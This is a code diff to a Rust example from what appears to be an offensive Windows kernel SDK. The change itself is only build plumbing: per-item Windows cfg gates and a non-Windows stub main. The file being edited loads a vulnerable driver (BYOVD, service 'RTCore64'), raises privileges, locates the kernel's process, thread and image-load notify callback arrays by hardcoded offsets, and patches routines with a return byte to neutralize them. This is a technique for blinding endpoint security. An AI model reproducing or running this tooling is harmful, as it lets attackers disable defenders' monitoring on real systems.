@@ -15,13 +15,18 @@
 //! ⚠️ 高风险：写错地址或 routine 首字节不止 0xC3 语义，可能 BSOD。每个
 //! routine 先 kread 验证首字节是合理指令字节（不是已 0xC3），再写。
 
-#![cfg(target_os = "windows")]
 
+
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::offsets::{notify_routines, RuntimeOffsets};
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::telemetry::{CallbackNeutralizer, NotifyArray};
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::{CallbackKit, KernelRw};
 
+#[cfg(target_os = "windows")]
 const SYS_PATH: &[u16] = &[
     'S' as u16,
     'y' as u16,
@@ -54,14 +59,19 @@ const SYS_PATH: &[u16] = &[
     's' as u16,
     0,
 ];
+#[cfg(target_os = "windows")]
 const SVC_NAME: &[u16] = &[
     'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
 ];
 
+#[cfg(target_os = "windows")]
 const PSP_CREATE_PROCESS_NOTIFY_RVA: u32 = 0x4D9D70;
+#[cfg(target_os = "windows")]
 const PSP_CREATE_THREAD_NOTIFY_RVA: u32 = 0x4D9970;
+#[cfg(target_os = "windows")]
 const PSP_LOAD_IMAGE_NOTIFY_RVA: u32 = 0x4D9B70;
 
+#[cfg(target_os = "windows")]
 extern "system" {
     fn RtlAdjustPrivilege(
         privilege: u32,
@@ -70,6 +80,7 @@ extern "system" {
         enabled: *mut i32,
     ) -> i32;
 }
+#[cfg(target_os = "windows")]
 fn enable_privileges() {
     for luid in [10u32, 20u32] {
         let mut p: i32 = 0;
@@ -78,6 +89,7 @@ fn enable_privileges() {
 }
 
 /// 枚举一个 notify 数组：返回 (slot_index, ctx_kva, routine_kva, first_byte) 列表。
+#[cfg(target_os = "windows")]
 fn enumerate_array(krw: &dyn KernelRw, array_kva: usize) -> Vec<(usize, usize, usize, u8)> {
     let mut out = Vec::new();
     for i in 0..notify_routines::ARRAY_LEN {
@@ -106,6 +118,7 @@ fn enumerate_array(krw: &dyn KernelRw, array_kva: usize) -> Vec<(usize, usize, u
     out
 }
 
+#[cfg(target_os = "windows")]
 fn main() {
     println!(
         "[callback_neutralize_test] start pid={}",
@@ -244,4 +257,24 @@ fn main() {
 
     println!("\n[callback_neutralize_test] DONE — callbacks neutralized then restored.");
     std::mem::forget(loaded);
+}
+
+
+// ----------------------------------------------------------------------------
+// Non-Windows entry-point fallback (E0601 mitigation).
+//
+// The real `fn main()` (and every Windows-only item above) is gated by
+// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
+// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
+// body compiles to nothing and the build would fail with E0601 ("main
+// function not found"). This stub exists solely to satisfy the crate root on
+// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
+// mutually exclusive with the Windows `main` above and never runs on target.
+// ----------------------------------------------------------------------------
+#[cfg(not(target_os = "windows"))]
+fn main() {
+    eprintln!(
+        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
+        env!("CARGO_BIN_NAME")
+    );
 }
